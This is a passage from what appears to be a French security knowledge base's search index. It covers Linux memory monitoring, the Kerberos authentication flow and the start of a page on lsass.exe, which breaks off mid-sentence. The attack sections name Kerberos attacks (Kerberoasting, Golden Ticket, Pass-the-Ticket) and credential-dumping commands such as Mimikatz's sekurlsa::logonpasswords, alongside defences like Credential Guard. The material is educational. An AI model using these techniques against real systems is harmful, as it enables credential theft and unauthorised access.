M\u00e9canismes</p> <ul> <li>Remplacement de Pages : Linux utilise des algorithmes sophistiqu\u00e9s pour choisir quelles pages \u00e9vincer lorsque la m\u00e9moire est sous pression. Il maintient g\u00e9n\u00e9ralement des listes de pages Actives et Inactives pour le Page Cache et la m\u00e9moire anonyme. Les pages passent d'Active \u00e0 Inactive si elles ne sont pas acc\u00e9d\u00e9es. L'algorithme de remplacement (souvent une variante de LRU ou une approximation) choisit des pages parmi les listes Inactives pour les r\u00e9clamer (les \u00e9crire sur disque/swap si n\u00e9cessaire, puis les lib\u00e9rer).</li> </ul> <p>4. Surveillance de la M\u00e9moire</p> <ul> <li><code>free</code> : Commande simple affichant la m\u00e9moire totale, utilis\u00e9e, libre, partag\u00e9e, buff/cache, et disponible (<code>available</code> est souvent la m\u00e9trique la plus utile car elle inclut la m\u00e9moire libre + la partie du cache facilement r\u00e9clamable).</li> <li><code>top</code> / <code>htop</code> : Affiche l'utilisation m\u00e9moire par processus (VIRT - virtuelle, RES - r\u00e9sidente physique, SHR - partag\u00e9e, %MEM).</li> <li><code>vmstat</code> : Fournit des statistiques sur la m\u00e9moire virtuelle, le swap (si/so - swapped in/out), l'activit\u00e9 disque et CPU.</li> <li><code>/proc/meminfo</code> : Fichier virtuel fournissant des informations tr\u00e8s d\u00e9taill\u00e9es sur l'\u00e9tat de la m\u00e9moire (Total, Free, Available, Buffers, Cached, SwapTotal, SwapFree, Slab, PageTables, etc.).</li> <li><code>smem</code> : Outil plus avanc\u00e9 qui tente de mesurer plus pr\u00e9cis\u00e9ment la m\u00e9moire r\u00e9ellement utilis\u00e9e par chaque processus (PSS - Proportional Set Size).</li> <li><code>slabtop</code> : Affiche des statistiques sur l'utilisation des diff\u00e9rents caches Slab.</li> </ul> <p>5. Implications pour la S\u00e9curit\u00e9</p> <p>Les consid\u00e9rations de s\u00e9curit\u00e9 sont globalement similaires \u00e0 celles de Windows :</p> <ul> <li>Forensique M\u00e9moire : L'analyse de dumps RAM (obtenus via des outils comme LiME - Linux Memory Extractor) est essentielle pour l'investigation d'incidents sur les syst\u00e8mes Linux. Volatility supporte \u00e9galement les profils Linux.</li> <li>Exploitation de Vuln\u00e9rabilit\u00e9s : Les m\u00eames types de vuln\u00e9rabilit\u00e9s m\u00e9moire existent. Linux dispose de m\u00e9canismes de d\u00e9fense :<ul> <li>ASLR : Randomisation de l'espace d'adressage (noyau et espace utilisateur).</li> <li>Stack Canaries : Protection contre les d\u00e9passements de tampon sur la pile.</li> <li>NX bit (No-Execute) : \u00c9quivalent du DEP Windows.</li> <li>KASLR (Kernel ASLR) : Randomisation de l'emplacement du code et des donn\u00e9es du noyau lui-m\u00eame.</li> </ul> </li> <li>Fuites d'Information : Le risque que des donn\u00e9es sensibles persistent en m\u00e9moire ou dans le swap existe \u00e9galement.</li> </ul> <p>6. Conclusion</p> <p>La gestion de la m\u00e9moire sous Linux est optimis\u00e9e pour la performance, notamment gr\u00e2ce \u00e0 son utilisation extensive du Page Cache qui transforme la RAM \"inutilis\u00e9e\" en un cache disque tr\u00e8s efficace. Des m\u00e9canismes comme le Buddy Allocator, le Slab Allocator, la pagination \u00e0 la demande et le Copy-on-Write contribuent \u00e0 une utilisation efficiente des ressources. Comprendre ces concepts, et notamment le r\u00f4le central du Page Cache et la signification des m\u00e9triques fournies par les outils de surveillance, est indispensable pour administrer, d\u00e9panner et s\u00e9curiser correctement un syst\u00e8me Linux.</p>"},{"location":"Ressources/Windows/Kerberos/","title":"Kerberos","text":"<p>1. Introduction</p> <p>Kerberos est un protocole d'authentification r\u00e9seau bas\u00e9 sur un syst\u00e8me de tickets et utilisant la cryptographie sym\u00e9trique. D\u00e9velopp\u00e9 au MIT, son objectif principal est de permettre \u00e0 des entit\u00e9s (utilisateurs, services) communiquant sur un r\u00e9seau non s\u00e9curis\u00e9 de prouver leur identit\u00e9 l'une \u00e0 l'autre de mani\u00e8re s\u00e9curis\u00e9e (authentification mutuelle). Il est con\u00e7u pour \u00e9viter la transmission de mots de passe en clair sur le r\u00e9seau. Kerberos est le protocole d'authentification par d\u00e9faut dans les domaines Microsoft Active Directory (AD).</p> <p>Le principe repose sur une tierce partie de confiance, le Key Distribution Center (KDC), qui conna\u00eet les \"secrets\" (cl\u00e9s d\u00e9riv\u00e9es des mots de passe ou cl\u00e9s de service) de toutes les entit\u00e9s et d\u00e9livre des tickets crypt\u00e9s.</p> <p>2. Composants Cl\u00e9s</p> <ul> <li>Client : L'utilisateur ou le service qui souhaite s'authentifier et acc\u00e9der \u00e0 une ressource.</li> <li>Service Cible (Target Service) : Le service (serveur de fichiers, serveur web, base de donn\u00e9es...) auquel le client souhaite acc\u00e9der. Chaque instance de service est identifi\u00e9e de mani\u00e8re unique par un Service Principal Name (SPN), par exemple <code>HTTP/websrv01.mondomaine.local</code> ou <code>CIFS/filesrv.mondomaine.local</code>.</li> <li>Key Distribution Center (KDC) : Le c\u0153ur du syst\u00e8me, g\u00e9n\u00e9ralement h\u00e9berg\u00e9 sur un Contr\u00f4leur de Domaine (DC) dans AD. Il est compos\u00e9 de deux services logiques :<ul> <li>Authentication Server (AS) : Authentifie initialement le client et lui d\u00e9livre un Ticket Granting Ticket (TGT).</li> <li>Ticket Granting Server (TGS) : D\u00e9livre des tickets de service (Service Tickets) pour des services sp\u00e9cifiques, sur pr\u00e9sentation d'un TGT valide.</li> </ul> </li> <li>Realm (Royaume) : Le domaine administratif de Kerberos. Dans le contexte AD, un royaume Kerberos correspond g\u00e9n\u00e9ralement \u00e0 un domaine AD.</li> <li>Tickets : Des donn\u00e9es crypt\u00e9es qui prouvent une identit\u00e9 ou une autorisation.<ul> <li>Ticket Granting Ticket (TGT) : Obtenu aupr\u00e8s de l'AS apr\u00e8s une premi\u00e8re authentification r\u00e9ussie. Il permet au client de prouver son identit\u00e9 au TGS sans avoir \u00e0 redonner son mot de passe. Le TGT contient notamment une Cl\u00e9 de Session TGS (TGS Session Key) et des informations sur le client, le tout chiffr\u00e9 avec la cl\u00e9 secr\u00e8te du service TGS (la cl\u00e9 du compte <code>krbtgt</code> dans AD).</li> <li>Ticket de Service (Service Ticket - ST) : Obtenu aupr\u00e8s du TGS pour un service sp\u00e9cifique. Il permet au client de s'authentifier aupr\u00e8s de ce service. Le ST contient notamment une Cl\u00e9 de Session de Service (Service Session Key) et des informations sur le client, le tout chiffr\u00e9 avec la cl\u00e9 secr\u00e8te du Service Cible.</li> </ul> </li> <li>Cl\u00e9s de Session (Session Keys) : Des cl\u00e9s sym\u00e9triques temporaires g\u00e9n\u00e9r\u00e9es par le KDC pour s\u00e9curiser les \u00e9changes entre deux entit\u00e9s pour une session donn\u00e9e (ex: Cl\u00e9 de Session TGS entre le client et le TGS, Cl\u00e9 de Session de Service entre le client et le Service Cible).</li> <li>Authentificateur (Authenticator) : Une structure de donn\u00e9es cr\u00e9\u00e9e par le client, contenant au minimum un timestamp et des informations sur le client, le tout chiffr\u00e9 avec la Cl\u00e9 de Session appropri\u00e9e (TGS Session Key pour parler au TGS, Service Session Key pour parler au Service Cible). Il prouve que le client poss\u00e8de la cl\u00e9 de session et que la requ\u00eate est r\u00e9cente (protection contre les attaques par rejeu).</li> <li>Cl\u00e9s \u00e0 Long Terme (Long-Term Keys) :<ul> <li>Cl\u00e9 Utilisateur : Cl\u00e9 sym\u00e9trique d\u00e9riv\u00e9e du mot de passe de l'utilisateur. Connue uniquement de l'utilisateur et du KDC.</li> <li>Cl\u00e9 de Service : Cl\u00e9 sym\u00e9trique associ\u00e9e \u00e0 un compte de service. Connue uniquement du service et du KDC. Dans AD, elle est d\u00e9riv\u00e9e du mot de passe du compte de service associ\u00e9 au SPN. La cl\u00e9 du service TGS est celle du compte <code>krbtgt</code>.</li> </ul> </li> </ul> <p>3. Le Flux d'Authentification D\u00e9taill\u00e9</p> <p>Le processus se d\u00e9roule typiquement en trois \u00e9changes majeurs :</p> <p>\u00c9tape 1 : AS Exchange (Demande et Obtention du TGT) - Messages <code>KRB_AS_REQ</code> et <code>KRB_AS_REP</code></p> <ol> <li><code>KRB_AS_REQ</code> (Client -&gt; AS) :<ul> <li>Le client (ex: l'utilisateur qui ouvre sa session) envoie une requ\u00eate \u00e0 l'AS.</li> <li>Contient : l'identifiant du client, l'identifiant du service TGS du royaume, un nonce (nombre al\u00e9atoire), et souvent des donn\u00e9es de pr\u00e9-authentification. La pr\u00e9-authentification la plus courante consiste en un timestamp chiffr\u00e9 avec la Cl\u00e9 Utilisateur (d\u00e9riv\u00e9e du mot de passe). Cela prouve au KDC que le client conna\u00eet le mot de passe avant de d\u00e9livrer un TGT.</li> </ul> </li> <li>V\u00e9rification par l'AS :<ul> <li>L'AS recherche la Cl\u00e9 Utilisateur correspondante dans sa base (l'annuaire AD).</li> <li>Il d\u00e9chiffre les donn\u00e9es de pr\u00e9-authentification avec cette cl\u00e9. Si le d\u00e9chiffrement r\u00e9ussit et que le timestamp est valide (dans une fen\u00eatre de temps acceptable pour contrer les rejeux), la pr\u00e9-authentification est r\u00e9ussie.</li> </ul> </li> <li>G\u00e9n\u00e9ration de la r\u00e9ponse par l'AS :<ul> <li>L'AS g\u00e9n\u00e8re une Cl\u00e9 de Session TGS al\u00e9atoire et unique pour cette session.</li> <li>Il cr\u00e9e le TGT, qui contient : la Cl\u00e9 de Session TGS, l'identifiant du client, la dur\u00e9e de validit\u00e9 du TGT, le tout chiffr\u00e9 avec la cl\u00e9 secr\u00e8te du TGS (cl\u00e9 du compte <code>krbtgt</code>). Le TGT est opaque pour le client.</li> </ul> </li> <li><code>KRB_AS_REP</code> (AS -&gt; Client) :<ul> <li>L'AS renvoie au client un message contenant :<ul> <li>Le TGT (chiffr\u00e9 avec la cl\u00e9 du TGS).</li> <li>La Cl\u00e9 de Session TGS et d'autres informations (dur\u00e9e de validit\u00e9, nonce), le tout chiffr\u00e9 avec la Cl\u00e9 Utilisateur.</li> </ul> </li> </ul> </li> <li>Traitement par le Client :<ul> <li>Le client utilise sa propre Cl\u00e9 Utilisateur (d\u00e9riv\u00e9e de son mot de passe) pour d\u00e9chiffrer la deuxi\u00e8me partie de la r\u00e9ponse.</li> <li>Il r\u00e9cup\u00e8re ainsi la Cl\u00e9 de Session TGS et stocke le TGT (qu'il ne peut pas lire) et la Cl\u00e9 de Session TGS dans son cache de tickets Kerberos (souvent g\u00e9r\u00e9 par Lsass.exe sous Windows).</li> <li>\u00c0 ce stade, le client est authentifi\u00e9 aupr\u00e8s du KDC et poss\u00e8de un TGT et la cl\u00e9 de session associ\u00e9e.</li> </ul> </li> </ol> <p>\u00c9tape 2 : TGS Exchange (Demande et Obtention du Ticket de Service) - Messages <code>KRB_TGS_REQ</code> et <code>KRB_TGS_REP</code></p> <ol> <li><code>KRB_TGS_REQ</code> (Client -&gt; TGS) :<ul> <li>Le client veut acc\u00e9der \u00e0 un service sp\u00e9cifique (ex: <code>CIFS/filesrv.mondomaine.local</code>).</li> <li>Il envoie une requ\u00eate au TGS.</li> <li>Contient : Le TGT obtenu \u00e0 l'\u00e9tape 1, le SPN du service cible, un nonce, et un Authentificateur. L'Authentificateur contient un timestamp et l'identifiant du client, le tout chiffr\u00e9 avec la Cl\u00e9 de Session TGS r\u00e9cup\u00e9r\u00e9e \u00e0 l'\u00e9tape 1.</li> </ul> </li> <li>V\u00e9rification par le TGS :<ul> <li>Le TGS re\u00e7oit la requ\u00eate et utilise sa propre cl\u00e9 secr\u00e8te (cl\u00e9 du compte <code>krbtgt</code>) pour d\u00e9chiffrer le TGT.</li> <li>Il extrait la Cl\u00e9 de Session TGS contenue dans le TGT.</li> <li>Il utilise cette Cl\u00e9 de Session TGS pour d\u00e9chiffrer l'Authentificateur envoy\u00e9 par le client.</li> <li>Il v\u00e9rifie le timestamp de l'Authentificateur (contre le rejeu) et compare l'identifiant client de l'Authentificateur avec celui du TGT.</li> </ul> </li> <li>G\u00e9n\u00e9ration de la r\u00e9ponse par le TGS :<ul> <li>Si tout est valide, le TGS g\u00e9n\u00e8re une Cl\u00e9 de Session de Service al\u00e9atoire et unique pour la communication entre le client et le service cible.</li> <li>Il cr\u00e9e le Ticket de Service (ST), qui contient : la Cl\u00e9 de Session de Service, l'identifiant du client, la dur\u00e9e de validit\u00e9, le tout chiffr\u00e9 avec la cl\u00e9 secr\u00e8te du Service Cible (associ\u00e9e au SPN demand\u00e9). Le ST est opaque pour le client.</li> </ul> </li> <li><code>KRB_TGS_REP</code> (TGS -&gt; Client) :<ul> <li>Le TGS renvoie au client un message contenant :<ul> <li>Le Ticket de Service (ST) (chiffr\u00e9 avec la cl\u00e9 du service cible).</li> <li>La Cl\u00e9 de Session de Service et d'autres informations (dur\u00e9e de validit\u00e9, nonce), le tout chiffr\u00e9 avec la Cl\u00e9 de Session TGS.</li> </ul> </li> </ul> </li> <li>Traitement par le Client :<ul> <li>Le client utilise la Cl\u00e9 de Session TGS (qu'il avait stock\u00e9e) pour d\u00e9chiffrer la deuxi\u00e8me partie de la r\u00e9ponse.</li> <li>Il r\u00e9cup\u00e8re ainsi la Cl\u00e9 de Session de Service et stocke le Ticket de Service (ST) (opaque) et la Cl\u00e9 de Session de Service dans son cache.</li> <li>\u00c0 ce stade, le client poss\u00e8de un ticket l'autorisant \u00e0 parler au service cible et la cl\u00e9 de session pour s\u00e9curiser cet \u00e9change.</li> </ul> </li> </ol> <p>\u00c9tape 3 : AP Exchange (Authentification aupr\u00e8s du Service Cible) - Messages <code>KRB_AP_REQ</code> et <code>KRB_AP_REP</code> (AP = Application)</p> <ol> <li><code>KRB_AP_REQ</code> (Client -&gt; Service Cible) :<ul> <li>Le client contacte enfin le service cible.</li> <li>Il envoie une requ\u00eate contenant :<ul> <li>Le Ticket de Service (ST) obtenu \u00e0 l'\u00e9tape 2.</li> <li>Un nouvel Authentificateur, contenant un timestamp et l'identifiant client, chiffr\u00e9 avec la Cl\u00e9 de Session de Service r\u00e9cup\u00e9r\u00e9e \u00e0 l'\u00e9tape 2.</li> </ul> </li> </ul> </li> <li>V\u00e9rification par le Service Cible :<ul> <li>Le service re\u00e7oit la requ\u00eate et utilise sa propre cl\u00e9 secr\u00e8te (associ\u00e9e \u00e0 son SPN) pour d\u00e9chiffrer le Ticket de Service (ST).</li> <li>Il extrait la Cl\u00e9 de Session de Service contenue dans le ST.</li> <li>Il utilise cette Cl\u00e9 de Session de Service pour d\u00e9chiffrer l'Authentificateur envoy\u00e9 par le client.</li> <li>Il v\u00e9rifie le timestamp de l'Authentificateur et compare l'identifiant client de l'Authentificateur avec celui du ST.</li> <li>Si tout est valide, le service est certain que le client a \u00e9t\u00e9 authentifi\u00e9 par le KDC et qu'il poss\u00e8de la cl\u00e9 de session partag\u00e9e. Le service peut extraire les informations d'autorisation (groupes SIDs) du ticket (plus pr\u00e9cis\u00e9ment du PAC - Privilege Attribute Certificate - inclus par le KDC dans les tickets en environnement AD).</li> </ul> </li> <li><code>KRB_AP_REP</code> (Service Cible -&gt; Client - Optionnel) :<ul> <li>Si l'authentification mutuelle est requise, le service peut renvoyer une r\u00e9ponse au client.</li> <li>Contient g\u00e9n\u00e9ralement le timestamp de l'Authentificateur du client, chiffr\u00e9 avec la Cl\u00e9 de Session de Service.</li> <li>Le client d\u00e9chiffre cette r\u00e9ponse avec la Cl\u00e9 de Session de Service. S'il r\u00e9ussit, il est certain de parler au bon service (car seul le vrai service conna\u00eet sa cl\u00e9 secr\u00e8te pour avoir d\u00e9chiffr\u00e9 le ST et obtenu la cl\u00e9 de session).</li> </ul> </li> </ol> <p>4. Aspects de S\u00e9curit\u00e9 et Attaques Courantes</p> <ul> <li>Points Forts :<ul> <li>Les mots de passe ne transitent pas en clair sur le r\u00e9seau (sauf potentiellement lors de la toute premi\u00e8re interaction si la pr\u00e9-authentification est mal configur\u00e9e ou tr\u00e8s faible).</li> <li>Authentification mutuelle (le client et le service peuvent v\u00e9rifier l'identit\u00e9 l'un de l'autre).</li> <li>Protection contre les attaques par rejeu gr\u00e2ce aux timestamps et aux nonces dans les Authentificateurs.</li> <li>Administration centralis\u00e9e via le KDC.</li> </ul> </li> <li>Points Faibles et Attaques :<ul> <li>D\u00e9pendance du KDC : Si le KDC est indisponible, l'authentification Kerberos ne fonctionne plus.</li> <li>Sensibilit\u00e9 au Temps : Les syst\u00e8mes (Client, KDC, Service) doivent avoir leurs horloges synchronis\u00e9es (g\u00e9n\u00e9ralement \u00e0 +/- 5 minutes pr\u00e8s) pour que les timestamps soient valides.</li> <li>Attaque sur la Pr\u00e9-authentification (AS-REP Roasting) : Si la pr\u00e9-authentification Kerberos est d\u00e9sactiv\u00e9e pour un compte utilisateur, un attaquant peut demander un TGT pour cet utilisateur. L'AS renverra la partie chiffr\u00e9e avec la Cl\u00e9 Utilisateur (<code>KRB_AS_REP</code>). L'attaquant peut alors tenter de cracker cette partie hors ligne par force brute pour retrouver le mot de passe de l'utilisateur.</li> <li>Kerberoasting : Un utilisateur authentifi\u00e9 peut demander des Tickets de Service (ST) pour n'importe quel service (SPN) du domaine. Si un compte de service (associ\u00e9 \u00e0 un SPN) a un mot de passe faible, un attaquant peut demander un ST pour ce service. Le TGS renverra la partie chiffr\u00e9e avec la cl\u00e9 du service (<code>KRB_TGS_REP</code>). L'attaquant peut alors tenter de cracker cette partie hors ligne par force brute pour retrouver le mot de passe du compte de service.</li> <li>Golden Ticket : Si un attaquant compromet le compte <code>krbtgt</code> (qui poss\u00e8de la cl\u00e9 secr\u00e8te du TGS), il peut forger des TGT valides pour n'importe quel utilisateur (m\u00eame inexistant), avec n'importe quels privil\u00e8ges (ex: Administrateur du Domaine), et pour une dur\u00e9e de validit\u00e9 tr\u00e8s longue. C'est une attaque de persistance tr\u00e8s puissante.</li> <li>Silver Ticket : Si un attaquant compromet la cl\u00e9 secr\u00e8te d'un compte de service sp\u00e9cifique (via Kerberoasting par exemple), il peut forger des Tickets de Service (ST) valides pour ce service uniquement, en usurpant l'identit\u00e9 de n'importe quel utilisateur.</li> <li>Pass-the-Ticket (PtT) : Si un attaquant r\u00e9cup\u00e8re un TGT ou un ST valide depuis la m\u00e9moire d'une machine compromise (ex: via Mimikatz sur Lsass.exe), il peut r\u00e9utiliser ce ticket depuis une autre machine pour acc\u00e9der aux ressources comme s'il \u00e9tait l'utilisateur l\u00e9gitime, sans conna\u00eetre le mot de passe.</li> </ul> </li> </ul> <p>5. Kerberos et Active Directory</p> <p>Active Directory utilise Kerberos comme protocole d'authentification principal. Les Contr\u00f4leurs de Domaine (DCs) h\u00e9bergent le service KDC. Le compte <code>krbtgt</code> est cr\u00e9\u00e9 automatiquement lors de la cr\u00e9ation du domaine et sa cl\u00e9 est essentielle \u00e0 la s\u00e9curit\u00e9 de Kerberos dans le domaine. Les SPNs sont des attributs des objets ordinateur ou utilisateur dans AD. Le KDC d'AD inclut des informations d'autorisation (SIDs des groupes de l'utilisateur) dans une structure appel\u00e9e Privilege Attribute Certificate (PAC) \u00e0 l'int\u00e9rieur des tickets.</p> <p>6. Conclusion</p> <p>Kerberos est un protocole d'authentification robuste et \u00e9prouv\u00e9, essentiel au fonctionnement s\u00e9curis\u00e9 des r\u00e9seaux modernes, en particulier ceux bas\u00e9s sur Active Directory. Sa complexit\u00e9 offre une s\u00e9curit\u00e9 solide contre de nombreuses menaces, mais elle introduit \u00e9galement des vecteurs d'attaque sp\u00e9cifiques qui n\u00e9cessitent une configuration rigoureuse (mots de passe forts pour les comptes de service, pr\u00e9-authentification activ\u00e9e), une surveillance attentive (d\u00e9tection des Golden/Silver tickets, Kerberoasting) et des m\u00e9canismes de d\u00e9fense compl\u00e9mentaires (Credential Guard, EPA - Extended Protection for Authentication) pour \u00eatre pleinement efficaces.</p> <pre><code>sequenceDiagram\n    participant Client\n    participant AS (Authentication Server)\n    participant TGS (Ticket Granting Server)\n    participant ServiceCible (Service Cible)\n\n    %% \u00c9tape 1: AS Exchange - Obtention du TGT %%\n    Client-&gt;&gt;AS: KRB_AS_REQ (ID Client, ID TGS, Nonce, Pr\u00e9-authentification{Cl\u00e9_Client})\n    Note right of AS: V\u00e9rifie Pr\u00e9-auth, G\u00e9n\u00e8re Cl\u00e9_Session_TGS\n    AS-&gt;&gt;Client: KRB_AS_REP (TGT{Cl\u00e9_TGS}, [Cl\u00e9_Session_TGS + Nonce]{Cl\u00e9_Client})\n    Note left of Client: D\u00e9chiffre avec Cl\u00e9_Client, stocke TGT et Cl\u00e9_Session_TGS\n\n    %% \u00c9tape 2: TGS Exchange - Obtention du Ticket de Service (ST) %%\n    Client-&gt;&gt;TGS: KRB_TGS_REQ (TGT{Cl\u00e9_TGS}, SPN_ServiceCible, Authentificateur{Cl\u00e9_Session_TGS})\n    Note right of TGS: D\u00e9chiffre TGT avec Cl\u00e9_TGS, &lt;br/&gt;V\u00e9rifie Authentificateur avec Cl\u00e9_Session_TGS, &lt;br/&gt;G\u00e9n\u00e8re Cl\u00e9_Session_Service\n    TGS-&gt;&gt;Client: KRB_TGS_REP (ST{Cl\u00e9_ServiceCible}, [Cl\u00e9_Session_Service + Nonce]{Cl\u00e9_Session_TGS})\n    Note left of Client: D\u00e9chiffre avec Cl\u00e9_Session_TGS, stocke ST et Cl\u00e9_Session_Service\n\n    %% \u00c9tape 3: AP Exchange - Acc\u00e8s au Service Cible %%\n    Client-&gt;&gt;ServiceCible: KRB_AP_REQ (ST{Cl\u00e9_ServiceCible}, Authentificateur{Cl\u00e9_Session_Service})\n    Note right of ServiceCible: D\u00e9chiffre ST avec Cl\u00e9_ServiceCible, &lt;br/&gt;V\u00e9rifie Authentificateur avec Cl\u00e9_Session_Service, &lt;br/&gt;Autorise l'acc\u00e8s\n    opt Authentification Mutuelle\n        ServiceCible-&gt;&gt;Client: KRB_AP_REP ([Timestamp_Client]{Cl\u00e9_Session_Service})\n        Note left of Client: V\u00e9rifie la r\u00e9ponse avec Cl\u00e9_Session_Service\n    end</code></pre>"},{"location":"Ressources/Windows/Lsass.exe/","title":"Lsass.exe","text":"<p>Nom Complet : Local Security Authority Subsystem Service Nom du Fichier Ex\u00e9cutable : <code>lsass.exe</code> Emplacement Typique : <code>%SystemRoot%\\System32\\</code> (g\u00e9n\u00e9ralement <code>C:\\Windows\\System32\\</code>)</p> <p>1. Introduction et R\u00f4le Fondamental</p> <p>LSASS est un processus critique du syst\u00e8me d'exploitation Windows responsable de la mise en \u0153uvre de la politique de s\u00e9curit\u00e9 sur le syst\u00e8me. Il ne s'ex\u00e9cute pas en mode noyau (kernel mode) mais en mode utilisateur (user mode), cependant, sa compromission ou son arr\u00eat entra\u00eene g\u00e9n\u00e9ralement une instabilit\u00e9 majeure du syst\u00e8me, voire un red\u00e9marrage forc\u00e9.</p> <p>Ses fonctions principales incluent : * La gestion de l'authentification des utilisateurs locaux et distants. * La g\u00e9n\u00e9ration des jetons d'acc\u00e8s (access tokens). * L'application des politiques de s\u00e9curit\u00e9 (ex: complexit\u00e9 des mots de passe, verrouillage de compte, droits utilisateur). * La gestion des \"secrets\" LSA (LSA Secrets).</p> <p>2. Processus d'Authentification D\u00e9taill\u00e9</p> <p>Lorsque vous vous connectez \u00e0 Windows (localement ou via le r\u00e9seau), le processus <code>winlogon.exe</code> (pour les sessions interactives) ou d'autres services (pour les acc\u00e8s r\u00e9seau) capturent vos informations d'identification (login/mot de passe, carte \u00e0 puce, biom\u00e9trie...). Ces informations sont ensuite transmises de mani\u00e8re s\u00e9curis\u00e9e \u00e0 LSASS.</p> <p>LSASS prend alors le relais : * Il fait appel \u00e0 des packages d'authentification enregistr\u00e9s (DLLs charg\u00e9es dans l'espace m\u00e9moire de LSASS). Les plus courants sont :     * <code>msv1_0.dll</code> : Pour l'authentification NTLM (utilis\u00e9 principalement pour les comptes locaux ou dans des environnements sans Kerberos). Il v\u00e9rifie les informations par rapport \u00e0 la base SAM (Security Account Manager) locale ou contacte un contr\u00f4leur de domaine.     * <code>kerberos.dll</code> : Pour l'authentification Kerberos (standard dans les environnements Active Directory). Il communique avec le Key Distribution Center (KDC) sur un contr\u00f4leur de domaine pour obtenir des tickets Kerberos (TGT, Service Tickets).     * <code>schannel.dll</code> : Pour l'authentification TLS/SSL.     * <code>wdigest.dll</code> (historique, souvent d\u00e9sactiv\u00e9) : Pour l'authentification Digest Access. Notamment connu car, s'il est activ\u00e9, il pouvait stocker une copie du mot de passe en clair dans la m\u00e9moire de LSASS. * Ces packages valident les informations d'identification fournies. * Si l'authentification r\u00e9ussit, LSASS est responsable de la cr\u00e9ation du jeton d'acc\u00e8s (Access Token) initial pour l'utilisateur.</p> <p>3. Gestion des Jetons d'Acc\u00e8s</p> <p>Apr\u00e8s une authentification r\u00e9ussie, LSASS g\u00e9n\u00e8re un jeton d'acc\u00e8s pour la session de l'utilisateur. Ce jeton contient des informations cruciales : * L'identifiant de s\u00e9curit\u00e9 (SID) de l'utilisateur. * Les SIDs des groupes auxquels l'utilisateur appartient. * Les privil\u00e8ges assign\u00e9s \u00e0 l'utilisateur (ex: <code>SeDebugPrivilege</code>, <code>SeShutdownPrivilege</code>). * D'autres informations de s\u00e9curit\u00e9.</p> <p>Ce jeton est ensuite associ\u00e9 au processus initial de l'utilisateur (comme <code>explorer.exe</code>) et est h\u00e9rit\u00e9 par les processus enfants lanc\u00e9s par cet utilisateur. Chaque fois qu'un processus tente d'acc\u00e9der \u00e0 une ressource s\u00e9curisable (fichier, cl\u00e9 de registre, objet syst\u00e8me), le syst\u00e8me compare le SID et les privil\u00e8ges du jeton avec la liste de contr\u00f4le d'acc\u00e8s (ACL) de la ressource pour autoriser ou refuser l'acc\u00e8s.</p> <p>4. Stockage des Informations Sensibles en M\u00e9moire</p> <p>C'est l'aspect qui int\u00e9resse le plus les attaquants (Red Team) et que les d\u00e9fenseurs (Blue Team) cherchent \u00e0 prot\u00e9ger. Pour faciliter le Single Sign-On (SSO) et l'acc\u00e8s transparent aux ressources r\u00e9seau sans redemander constamment les mots de passe, LSASS conserve diverses formes d'informations d'identification en m\u00e9moire pendant la dur\u00e9e de vie de la session utilisateur ou du syst\u00e8me : * Tickets Kerberos (TGT, Service Tickets) : Utilis\u00e9s pour l'authentification dans un domaine AD. * Hashes NTLM : D\u00e9riv\u00e9s du mot de passe de l'utilisateur, utilis\u00e9s pour l'authentification NTLM. * Potentiellement des mots de passe en clair : Si WDigest est activ\u00e9 (moins courant aujourd'hui) ou via d'autres m\u00e9canismes/vuln\u00e9rabilit\u00e9s. * Cl\u00e9s de session DPAPI : Utilis\u00e9es pour d\u00e9chiffrer certaines donn\u00e9es utilisateur prot\u00e9g\u00e9es. * LSA Secrets : Mots de passe des comptes de service, cl\u00e9s diverses stock\u00e9es par le syst\u00e8me.</p> <p>5. Perspective Attaquant (Red Team)</p> <p>LSASS est une cible de choix pour l'extraction d'informations d'identification (\"Credential Dumping\"). L'objectif est de lire la m\u00e9moire du processus <code>lsass.exe</code> pour en extraire les informations sensibles list\u00e9es ci-dessus.</p> <ul> <li>Techniques Courantes :<ul> <li>Utilisation d'outils d\u00e9di\u00e9s : Le plus c\u00e9l\u00e8bre est Mimikatz (<code>sekurlsa::logonpasswords</code>, <code>sekurlsa::tickets</code>, <code>lsadump::secrets</code>). Ces outils utilisent des API Windows (comme <code>DebugActiveProcess</code>, <code>ReadProcessMemory</code>) ou des techniques plus avanc\u00e9es pour lire directement la m\u00e9moire de LSASS.</li> <li>Dump de la m\u00e9moire : Cr\u00e9er un fichier de vidage complet de la m\u00e9moire de LSASS (par exemple, via le Gestionnaire des t\u00e2ches, <code>procdump.exe</code> de Sysinternals, ou des API comme <code>MiniDumpWriteDump</code>). Ce fichier peut ensuite \u00eatre analys\u00e9 hors ligne sur une machine contr\u00f4l\u00e9e par l'attaquant avec des outils comme Mimikatz ou Pypykatz.</li> </ul> </li> <li>Pr\u00e9requis : L'attaquant a besoin de privil\u00e8ges \u00e9lev\u00e9s sur la machine cible (typiquement Administrateur local ou SYSTEM) pour pouvoir acc\u00e9der \u00e0 la m\u00e9moire du processus LSASS. <code>SeDebugPrivilege</code> est souvent requis.</li> <li>Impact : La r\u00e9cup\u00e9ration de ces informations permet des mouvements lat\u00e9raux (pass-the-hash, pass-the-ticket), l'escalade de privil\u00e8ges, et l'acc\u00e8s \u00e0 d'autres syst\u00e8mes et donn\u00e9es.</li> </ul> <p>6. Perspective D\u00e9fenseur (Blue Team)</p> <p>Prot\u00e9ger LSASS et d\u00e9tecter les tentatives de compromission est crucial.</p> <ul> <li>M\u00e9canismes de Protection :<ul> <li>Protected Process Light (PPL) pour LSASS : Introduit dans Windows 8.1/Server 2012 R2. Si activ\u00e9 (via une cl\u00e9 de registre <code>RunAsPPL</code>), LSASS s'ex\u00e9cute comme un processus prot\u00e9g\u00e9. Cela emp\u00eache les processus non-prot\u00e9g\u00e9s (m\u00eame ceux ex\u00e9cut\u00e9s en tant qu'Administrateur) d'ouvrir un handle sur LSASS avec des droits d'acc\u00e8s \u00e9tendus (comme la lecture de m\u00e9moire ou l'injection de code). Seuls les processus sign\u00e9s par Microsoft et ayant la bonne EKU (Enhanced Key Usage) peuvent interagir pleinement avec un LSASS prot\u00e9g\u00e9.</li> <li>Credential Guard : Introduit dans Windows 10/Server 2016. Utilise la S\u00e9curit\u00e9 Bas\u00e9e sur la Virtualisation (VBS) pour isoler le processus LSASS (ou plut\u00f4t une partie critique appel\u00e9e LSAIso - LSA Isolated) dans un environnement virtualis\u00e9 s\u00e9par\u00e9 du syst\u00e8me d'exploitation principal. Les secrets (comme les hashes NTLM, tickets Kerberos TGT) sont stock\u00e9s et g\u00e9r\u00e9s dans cet environnement isol\u00e9, rendant leur extraction depuis le LSASS normal (tournant dans le syst\u00e8me principal) impossible, m\u00eame avec des privil\u00e8ges SYSTEM. Mimikatz ne peut pas 